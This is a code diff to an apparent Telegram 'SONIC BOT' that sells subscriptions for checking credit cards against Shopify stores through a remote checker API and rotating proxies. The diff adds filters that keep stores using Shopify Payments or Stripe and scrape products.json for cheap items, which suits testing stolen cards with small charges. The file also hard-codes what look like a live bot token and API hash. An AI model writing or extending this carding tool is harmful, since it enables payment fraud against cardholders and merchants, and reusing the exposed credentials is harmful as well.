@@ -17,7 +17,7 @@ CHECKER_API_URL = 'https://apiehopf-production.up.railway.app'
 API_ID = 38208016
 API_HASH = '0d52125034b6a0d0dac3e71b40cea032'
 BOT_TOKEN = '8985561921:AAH26NPSH3Iin7RCpKfi1Q057X1umDjfgds'
-ADMIN_IDS = [1093032296,7077116674]
+ADMIN_IDS = [1093032296]
 
 # إعدادات الاشتراك الزمني بالنجوم
 STAR_PRICES = {
@@ -36,11 +36,23 @@ MESSAGE_DELAY = 1.5
 MAX_RETRY_ON_FLOOD = 3
 MAX_WORKERS = 4
 
+# البوابات المسموحة فقط (Shopify)
+ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments', 'stripe']
+
+# نطاقات الأسعار للفلتر
+PRICE_RANGES = {
+    "1": {"name": "🔰 1$ - 10$", "min": 1, "max": 10},
+    "2": {"name": "💰 5$ - 20$", "min": 5, "max": 20},
+    "3": {"name": "💎 10$ - 30$", "min": 10, "max": 30},
+    "4": {"name": "⭐ No filter", "min": 0, "max": 999999}
+}
+
 # متغيرات التحكم
 user_last_message_time = {}
 active_sessions = {}
 user_current_check = {}
 user_pending_mass = {}
+user_pending_sites = {}  # للمواقع المنتظرة بعد رفع ملف
 
 bot = TelegramClient('joker_bot', API_ID, API_HASH)
 
@@ -330,8 +342,18 @@ def get_admin_sites_menu():
         [Button.inline("➕ Add Site", b"admin_add_site")],
         [Button.inline("🗑️ Remove Site", b"admin_remove_site")],
         [Button.inline("📁 Upload File", b"admin_upload_sites")],
+        [Button.inline("🔍 Check Sites", b"admin_check_sites")],
         [Button.inline("💣 Clear All", b"admin_clear_sites")],
         [Button.inline("🔙 Back", b"admin_panel")]
+    ]
+
+def get_price_filter_keyboard():
+    return [
+        [Button.inline("🔰 1$ - 10$", b"price_1")],
+        [Button.inline("💰 5$ - 20$", b"price_2")],
+        [Button.inline("💎 10$ - 30$", b"price_3")],
+        [Button.inline("⭐ No filter", b"price_4")],
+        [Button.inline("🔙 Cancel", b"price_cancel")]
     ]
 
 async def get_user_stats_text(user_id, username):
@@ -363,9 +385,7 @@ async def get_user_stats_text(user_id, username):
     text += f"🔌 Add proxies: /addproxy or /addproxies"
     return text
 
-# ==================== دوال API السريعة ====================
-ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments']
-
+# ==================== دوال API ====================
 def parse_proxy_url(proxy_str):
     if not proxy_str:
         return None
@@ -380,7 +400,7 @@ def parse_proxy_url(proxy_str):
         return f"http://{host}:{port}"
     return None
 
-# فحص بروكسي سريع (مهلة 3 ثواني)
+# فحص بروكسي سريع
 async def test_proxy_fast(proxy_str):
     proxy_url = parse_proxy_url(proxy_str)
     if not proxy_url:
@@ -395,31 +415,89 @@ async def test_proxy_fast(proxy_str):
     except:
         return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Timeout'}
 
-# فحص موقع سريع (مهلة 5 ثواني)
-async def test_site_fast(site, proxy):
+# فحص موقع أساسي
+async def test_site_basic(site, proxy):
     test_card = "4031630422575208|01|2030|280"
     try:
         site = site.replace('https://', '').replace('http://', '').rstrip('/')
         url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
         if proxy:
             url += f'&proxy={proxy}'
-        
-        timeout = aiohttp.ClientTimeout(total=5)
+        timeout = aiohttp.ClientTimeout(total=10)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as resp:
                 if resp.status != 200:
                     return {'site': site, 'status': 'dead'}
-                try:
-                    raw = await resp.json()
-                    if raw.get('Status', False):
-                        return {'site': site, 'status': 'alive'}
-                    return {'site': site, 'status': 'dead'}
-                except:
-                    return {'site': site, 'status': 'dead'}
+                raw = await resp.json()
+                return {'site': site, 'status': 'alive' if raw.get('Status') else 'dead'}
     except:
         return {'site': site, 'status': 'dead'}
 
-# فحص كارت عادي
+# جلب Gateway الموقع
+async def get_site_gateway(site, proxy):
+    test_card = "4031630422575208|01|2030|280"
+    try:
+        site = site.replace('https://', '').replace('http://', '').rstrip('/')
+        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
+        if proxy:
+            url += f'&proxy={proxy}'
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return None
+                raw = await resp.json()
+                return raw.get('Gateway', '').lower()
+    except:
+        return None
+
+# جلب أرخص سعر منتج في الموقع
+async def get_site_min_price(site):
+    try:
+        site = site.replace('https://', '').replace('http://', '').rstrip('/')
+        url = f'https://{site}/products.json?limit=50'
+        timeout = aiohttp.ClientTimeout(total=15)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return None
+                data = await resp.json()
+                min_price = None
+                for product in data.get('products', []):
+                    for variant in product.get('variants', []):
+                        if variant.get('available', True):
+                            try:
+                                price = float(variant.get('price', 0))
+                                if min_price is None or price < min_price:
+                                    min_price = price
+                            except:
+                                pass
+                return min_price
+    except:
+        return None
+
+# فحص موقع كامل (للفلتر)
+async def check_site_full(site, proxy, price_range):
+    """فحص موقع كامل: التحقق من الـ Gateway والسعر"""
+    try:
+        # 1. فحص الـ Gateway
+        gateway = await get_site_gateway(site, proxy)
+        if not gateway or not any(allowed in gateway for allowed in ALLOWED_GATEWAYS):
+            return {'site': site, 'status': 'dead', 'reason': f'Gateway: {gateway or "Unknown"}'}
+        
+        # 2. فحص السعر إذا كان مطلوب
+        if price_range["min"] > 0 or price_range["max"] < 999999:
+            min_price = await get_site_min_price(site)
+            if min_price is None:
+                return {'site': site, 'status': 'dead', 'reason': 'No products found'}
+            if min_price > price_range["max"]:
+                return {'site': site, 'status': 'dead', 'reason': f'Min price ${min_price:.2f} > ${price_range["max"]}'}
+        
+        return {'site': site, 'status': 'alive', 'reason': f'Gateway: {gateway}'}
+    except Exception as e:
+        return {'site': site, 'status': 'dead', 'reason': str(e)[:50]}
+
+# فحص كارت
 async def check_card(card, site, proxy):
     try:
         site = site.replace('https://', '').replace('http://', '').rstrip('/')
@@ -657,7 +735,7 @@ async def handle_callback(event):
 ├ /rmsite url - Remove site
 ├ /addsites - Upload sites file
 ├ /clearsites - Clear all
-├ /sitecheck - Check all sites
+├ /sitecheck - Check & filter sites
 ├ /mysites - View all sites
 
 <b>🔌 YOUR PROXIES</b>
@@ -712,13 +790,25 @@ async def handle_callback(event):
         if not sites:
             await event.edit(premium_emoji("❌ No sites to remove."), parse_mode='html')
         else:
-            kb = [[Button.inline(s, f"remove_site_{s}")] for s in sites[:20]]
+            kb = [[Button.inline(s[:30], f"remove_site_{s}")] for s in sites[:20]]
             kb.append([Button.inline("🔙 Back", b"admin_sites")])
             await event.edit(premium_emoji("🗑️ <b>Select site to remove:</b>"), buttons=kb, parse_mode='html')
     
     elif data == "admin_upload_sites" and is_admin(user_id):
-        await event.edit(premium_emoji("📁 <b>Send a .txt file with sites</b>\n\nOne site per line.\n\nSend /cancel to cancel."), parse_mode='html')
+        await event.edit(premium_emoji("📁 <b>Send a .txt file with sites</b>\n\nOne site per line.\n\nYou will then select a price filter."), parse_mode='html')
         bot.register_next_step(event, admin_upload_sites_step)
+    
+    elif data == "admin_check_sites" and is_admin(user_id):
+        sites = load_sites()
+        if not sites:
+            await event.edit(premium_emoji("❌ No sites to check."), parse_mode='html')
+        else:
+            user_pending_sites[user_id] = {
+                'action': 'check',
+                'sites': sites,
+                'expires': time.time() + PENDING_TIMEOUT
+            }
+            await event.edit(premium_emoji("💰 <b>Select price range to filter sites:</b>\n\nSites with cheapest product above selected range will be removed."), buttons=get_price_filter_keyboard(), parse_mode='html')
     
     elif data == "admin_clear_sites" and is_admin(user_id):
         save_sites([])
@@ -732,6 +822,15 @@ async def handle_callback(event):
             await event.edit(premium_emoji(f"✅ Removed: {site}"), buttons=get_admin_sites_menu(), parse_mode='html')
         else:
             await event.edit(premium_emoji(f"❌ Site not found."), buttons=get_admin_sites_menu(), parse_mode='html')
+    
+    elif data.startswith("price_") and is_admin(user_id):
+        price_key = data.split("_")[1]
+        await handle_price_filter(event, user_id, price_key)
+    
+    elif data == "price_cancel" and is_admin(user_id):
+        if user_id in user_pending_sites:
+            del user_pending_sites[user_id]
+        await event.edit(premium_emoji("❌ Cancelled."), buttons=get_admin_sites_menu(), parse_mode='html')
     
     elif data in ["admin_stats", "admin_broadcast", "admin_block", "admin_unblock", "admin_set_limit"] and is_admin(user_id):
         msgs = {
@@ -750,7 +849,77 @@ async def handle_callback(event):
     
     await event.answer()
 
-# دوال الخطوات للأدمن
+# ==================== معالج فلتر السعر ====================
+async def handle_price_filter(event, user_id, price_key):
+    if user_id not in user_pending_sites:
+        await event.edit(premium_emoji("❌ Session expired. Please use /sitecheck again."), buttons=get_admin_sites_menu(), parse_mode='html')
+        return
+    
+    pending = user_pending_sites.pop(user_id)
+    sites = pending['sites']
+    action = pending.get('action', 'check')
+    price_range = PRICE_RANGES.get(price_key, PRICE_RANGES["4"])
+    
+    proxies = load_user_proxies(user_id)
+    if not proxies:
+        await event.edit(premium_emoji("❌ No proxies available. Add proxies first."), buttons=get_admin_sites_menu(), parse_mode='html')
+        return
+    
+    await event.edit(premium_emoji(f"🔍 Checking {len(sites)} sites with filter: {price_range['name']}\n\n⏳ This may take a few seconds..."), parse_mode='html')
+    
+    valid_sites = []
+    invalid_sites = []
+    
+    for i, site in enumerate(sites):
+        proxy = random.choice(proxies)
+        result = await check_site_full(site, proxy, price_range)
+        
+        if result['status'] == 'alive':
+            valid_sites.append(site)
+        else:
+            invalid_sites.append({'site': site, 'reason': result['reason']})
+        
+        if (i + 1) % 10 == 0:
+            await event.edit(premium_emoji(f"🔍 Progress: {i+1}/{len(sites)}\n✅ Valid: {len(valid_sites)}\n❌ Invalid: {len(invalid_sites)}"), parse_mode='html')
+    
+    if action == 'check':
+        save_sites(valid_sites)
+        result_text = f"""✅ <b>Site Check Complete!</b>
+
+📊 Total sites before: {len(sites)}
+✅ Valid sites (Shopify): {len(valid_sites)}
+❌ Invalid sites: {len(invalid_sites)}
+
+💰 Filter applied: {price_range['name']}
+🔌 Gateway: Shopify Payments only
+
+Sites have been updated with only valid sites."""
+
+        if invalid_sites:
+            result_text += f"\n\n<b>❌ Removed sites (first 10):</b>\n"
+            for inv in invalid_sites[:10]:
+                result_text += f"• {inv['site'][:40]} - {inv['reason']}\n"
+            if len(invalid_sites) > 10:
+                result_text += f"• ... and {len(invalid_sites) - 10} more"
+    
+    else:
+        current_sites = load_sites()
+        new_sites = [s for s in valid_sites if s not in current_sites]
+        all_sites = list(set(current_sites + valid_sites))
+        save_sites(all_sites)
+        result_text = f"""✅ <b>Sites Added with Filters!</b>
+
+📊 Total sites in file: {len(sites)}
+✅ Valid sites (Shopify): {len(valid_sites)}
+📝 New sites added: {len(new_sites)}
+🌐 Total sites now: {len(all_sites)}
+
+💰 Filter applied: {price_range['name']}
+🔌 Gateway: Shopify Payments only"""
+    
+    await event.edit(premium_emoji(result_text), buttons=get_admin_sites_menu(), parse_mode='html')
+
+# ==================== دوال الخطوات للأدمن ====================
 async def admin_add_site_step(event):
     if event.text and event.text.lower() == '/cancel':
         await event.edit(premium_emoji("❌ Cancelled."), buttons=get_admin_menu_keyboard(), parse_mode='html')
@@ -767,22 +936,33 @@ async def admin_upload_sites_step(event):
     if event.text and event.text.lower() == '/cancel':
         await event.edit(premium_emoji("❌ Cancelled."), buttons=get_admin_menu_keyboard(), parse_mode='html')
         return
+    
     if not event.is_reply or not event.reply_to_msg_id:
         await event.edit(premium_emoji("❌ Reply to a .txt file"), buttons=get_admin_menu_keyboard(), parse_mode='html')
         return
+    
     reply = await event.get_reply_message()
     if not reply.file or not reply.file.name.endswith('.txt'):
         await event.edit(premium_emoji("❌ Please reply to a .txt file"), buttons=get_admin_menu_keyboard(), parse_mode='html')
         return
+    
     path = await reply.download_media()
     async with aiofiles.open(path, 'r') as f:
         content = await f.read()
     new_sites = [l.strip().replace('https://', '').replace('http://', '').rstrip('/') for l in content.split('\n') if l.strip()]
     os.remove(path)
-    current = load_sites()
-    all_sites = list(dict.fromkeys(current + new_sites))
-    save_sites(all_sites)
-    await event.edit(premium_emoji(f"✅ Added {len(new_sites)} sites\nTotal: {len(all_sites)}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
+    
+    if not new_sites:
+        await event.edit(premium_emoji("❌ No valid sites found"), buttons=get_admin_menu_keyboard(), parse_mode='html')
+        return
+    
+    user_pending_sites[event.sender_id] = {
+        'action': 'add',
+        'sites': new_sites,
+        'expires': time.time() + PENDING_TIMEOUT
+    }
+    
+    await event.edit(premium_emoji(f"💰 <b>Select price range to filter sites:</b>\n\n{len(new_sites)} sites found.\nSites with cheapest product above selected range will be removed."), buttons=get_price_filter_keyboard(), parse_mode='html')
 
 async def admin_callback_handler(event, action):
     if event.text and event.text.lower() == '/cancel':
@@ -891,7 +1071,7 @@ async def mysites_cmd(event):
         return
     sites = load_sites()
     if not sites:
-        await send_with_retry(user_id, premium_emoji("📋 No sites found. Use /site to add."), parse_mode='html')
+        await send_with_retry(user_id, premium_emoji("📋 No sites found."), parse_mode='html')
         return
     if len(sites) <= 30:
         await send_with_retry(user_id, premium_emoji(f"📋 <b>Sites ({len(sites)}):</b>\n\n" + "\n".join(f"• {s}" for s in sites)), parse_mode='html')
@@ -921,7 +1101,7 @@ async def add_site_cmd(event):
         return
     
     msg = await send_with_retry(user_id, premium_emoji(f"🔄 Testing {site}..."), parse_mode='html')
-    result = await test_site_fast(site, random.choice(proxies))
+    result = await test_site_basic(site, random.choice(proxies))
     
     if result['status'] == 'alive':
         sites = load_sites()
@@ -985,12 +1165,16 @@ async def addsites_cmd(event):
     if not new_sites:
         await send_with_retry(user_id, premium_emoji("❌ No valid sites found"), parse_mode='html')
         return
-    current = load_sites()
-    all_sites = list(dict.fromkeys(current + new_sites))
-    save_sites(all_sites)
-    await send_with_retry(user_id, premium_emoji(f"✅ Added {len(new_sites)} sites\nTotal: {len(all_sites)}"), parse_mode='html')
+    
+    user_pending_sites[user_id] = {
+        'action': 'add',
+        'sites': new_sites,
+        'expires': time.time() + PENDING_TIMEOUT
+    }
+    
+    await send_with_retry(user_id, premium_emoji(f"💰 <b>Select price range to filter sites:</b>\n\n{len(new_sites)} sites found.\nSites with cheapest product above selected range will be removed.\n\nYou have 5 minutes to select."), buttons=get_price_filter_keyboard(), parse_mode='html')
 
-# ==================== فحص المواقع السريع ====================
+# ==================== فحص المواقع مع فلتر السعر ====================
 @bot.on(events.NewMessage(pattern='/sitecheck'))
 async def sitecheck_cmd(event):
     user_id = event.sender_id
@@ -1008,43 +1192,13 @@ async def sitecheck_cmd(event):
         await send_with_retry(user_id, premium_emoji("❌ No proxies available. Add proxies first."), parse_mode='html')
         return
     
-    total = len(sites)
-    msg = await send_with_retry(user_id, premium_emoji(f"⚡ Fast checking {total} sites...\n\n⏱️ Estimated: ~{max(3, total // 10)} seconds"), parse_mode='html')
+    user_pending_sites[user_id] = {
+        'action': 'check',
+        'sites': sites,
+        'expires': time.time() + PENDING_TIMEOUT
+    }
     
-    batch_size = 10
-    alive = []
-    dead = []
-    checked = 0
-    
-    for i in range(0, total, batch_size):
-        batch = sites[i:i+batch_size]
-        tasks = []
-        for site in batch:
-            proxy = random.choice(proxies)
-            tasks.append(test_site_fast(site, proxy))
-        
-        results = await asyncio.gather(*tasks)
-        
-        for res in results:
-            if res['status'] == 'alive':
-                alive.append(res['site'])
-            else:
-                dead.append(res['site'])
-        
-        checked += len(batch)
-        await msg.edit(premium_emoji(f"⚡ Checking sites...\n\n📊 {checked}/{total}\n✅ Alive: {len(alive)}\n❌ Dead: {len(dead)}"), parse_mode='html')
-    
-    save_sites(alive)
-    
-    result_text = f"""✅ <b>Site Check Complete!</b>
-
-📊 Total: {total}
-✅ Alive: {len(alive)}
-❌ Dead: {len(dead)}
-
-💡 Sites updated with only working ones."""
-    
-    await msg.edit(premium_emoji(result_text), parse_mode='html')
+    await send_with_retry(user_id, premium_emoji("💰 <b>Select price range to filter sites:</b>\n\nSites with cheapest product above selected range will be removed.\n\nChoose 'No filter' to keep all working Shopify sites."), buttons=get_price_filter_keyboard(), parse_mode='html')
 
 # ==================== أوامر إدارة البروكسيات السريعة ====================
 @bot.on(events.NewMessage(pattern='/addproxy'))
@@ -1052,7 +1206,7 @@ async def addproxy_cmd(event):
     user_id = event.sender_id
     lines = event.text.split('\n')[1:]
     if not lines:
-        await send_with_retry(user_id, premium_emoji("❌ Send proxies after command, one per line\n\nExample:\n/proxy\nip:port:user:pass\nip:port"), parse_mode='html')
+        await send_with_retry(user_id, premium_emoji("❌ Send proxies after command, one per line\n\nExample:\n/addproxy\nip:port:user:pass\nip:port"), parse_mode='html')
         return
     current = load_user_proxies(user_id)
     new = [p.strip() for p in lines if p.strip() and p.strip() not in current]
@@ -1656,8 +1810,8 @@ async def main():
     
     asyncio.create_task(check_for_payments())
     
-    print("=" * 50)
-    print("✅ SONIC BOT STARTED (FAST VERSION)")
+    print("=" * 55)
+    print("✅ SONIC BOT STARTED (Full Version)")
     print(f"👑 Admins: {ADMIN_IDS}")
     print(f"⭐ Subscription plans:")
     print(f"   - 1 Hour: 30 stars")
@@ -1667,8 +1821,10 @@ async def main():
     print(f"   - 1 Week: 500 stars")
     print(f"📊 Max cards per combo: {MAX_CARDS_PER_COMBO}")
     print(f"🌐 Sites file: sites.txt ({len(load_sites())} sites)")
+    print(f"🔌 Gateway filter: Shopify Payments only")
+    print(f"💰 Price filter: 1$-10$, 5$-20$, 10$-30$, or No filter")
     print(f"⚙️ Workers: {MAX_WORKERS}")
-    print("=" * 50)
+    print("=" * 55)
     
     await bot.run_until_disconnected()
 
